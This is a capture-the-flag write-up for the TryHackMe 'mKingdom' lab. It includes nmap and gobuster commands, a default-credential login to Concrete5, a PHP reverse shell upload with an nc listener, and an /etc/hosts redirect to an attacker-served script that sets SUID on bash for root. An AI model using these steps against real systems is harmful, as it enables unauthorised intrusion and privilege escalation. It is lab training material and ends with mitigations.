[mKingdom](https://tryhackme.com/room/mkingdom)

**Difficulty:** Easy 
**Objective:** Exploit Concrete5 CMS for remote shell access, escalate privileges via `/etc/hosts` manipulation and SUID bit on bash to retrieve both flags.

---

## Table of Contents  
- [1. Summary](#1-summary)  
- [2. Methodology](#2-methodology)  
- [3. Reconnaissance](#3-reconnaissance)  
- [4. Enumeration](#4-enumeration)  
- [5. Exploitation](#5-exploitation)  
- [6. Privilege Escalation](#6-privilege-escalation)  
- [7. Post Exploitation](#7-post-exploitation)  
- [8. Flags / Proof](#8-flags--proof)  
- [9. Mitigations](#9-mitigations)  
- [10. Notes](#10-notes)

---

## 1. Summary  
**IP/URL:** 10.10.190.204  
**Service/Ports:** 85/HTTP  
**Entry Point:** Authenticated RCE via Concrete5 CMS admin panel  
**Privilege Escalation:** Overwrote `/etc/hosts`, executed remote script to apply SUID on bash  
**Outcome:** Shell as root, both flags captured

---

## 2. Methodology  
Following the PTES (Penetration Testing Execution Standard):  
1. Reconnaissance  
2. Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance  
Initial Nmap scan:  
nmap -sV -sS 10.10.190.204  
Results:  
85/tcp open http Apache httpd 2.4.7 ((Ubuntu))

Visited:  
http://10.10.190.204:85/ → nothing useful  
Ran Gobuster:  
gobuster dir -u http://10.10.190.204:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
Found `/app`, then redirected to `/app/castle/` via Jump link  
Discovered Concrete5 CMS (v8.5.2)

---

## 4. Enumeration  
Tested default credentials on login page:  
admin:admin → failed  
admin:password → success  
Confirmed admin access  
Researched vulnerabilities for Concrete5 8.5.2  
Enabled PHP in the file upload whitelist  
Uploaded php-reverse-shell from: https://github.com/pentestmonkey/php-reverse-shell  
Started listener: nc -lvnp 1337  
Spawned shell:  
python -c 'import pty;pty.spawn("/bin/bash")'

---

## 5. Exploitation  
Initial recon commands were unhelpful:  
sudo -l  
find / -perm -4000  

Uploaded and ran `linpeas.sh`  
Discovered a plaintext password for user `toad`  
Switched user: su toad → successful  

Ran LinPEAS again  
Found a base64-encoded string — decoded to get password for user `mario`  
Switched to `mario`  
Used `head` to retrieve first flag  
Enumerated permissions and discovered `mario` could write to `/etc/hosts`

---

## 6. Privilege Escalation  
Couldn’t edit `/etc/hosts` using `vim` or `nano`  
Used this command to overwrite `/etc/hosts` entry for mkingdom.thm:  
cat /etc/hosts | sed 's/127\.0\.1\.1\tmkingdom\.thm/IP.IP.IP.IP\t\tmkingdom.thm/g' > /tmp/hosts  
Copied modified file to `/etc/hosts`  
Created `/app/castle/application/counter.sh` on attacker’s HTTP server:  
#!/bin/bash  
chmod u+s /bin/bash  

Used curl on target to pull the script:  
curl mkingdom.thm:85/app/castle/application/counter.sh  
Executed: /bin/bash -p  
Gained root shell

---

## 7. Post Exploitation  
Ran: head /root/root.txt  

Captured final flag

---

## 8. Flags / Proof  
User Flag: Retrieved using `head` as user `mario`

Root Flag: Retrieved from `/root/root.txt` after applying SUID and spawning privileged shell

---

## 9. Mitigations  
| Vulnerability                    | Risk   | Suggested Mitigation                                |  
|----------------------------------|--------|-----------------------------------------------------|  
| Default CMS credentials          | High   | Enforce strong credential policies                  |  
| File upload with PHP execution  | High   | Restrict executable uploads, whitelist extensions   |  
| `/etc/hosts` write permissions  | High   | Restrict write access to system config files        |  
| SUID on bash                    | Critical | Audit script delivery vectors and remove unnecessary SUID bits |

---

## 10. Notes  
Time spent: ~3 hours  

Tools used: nmap, gobuster, linpeas.sh, curl, nc, Python, sed  

Lessons learned: File upload + CMS vulnerabilities can lead to full compromise. Watch for writable system files, creative privilege escalations via curl and hosts manipulation can be game-changers.
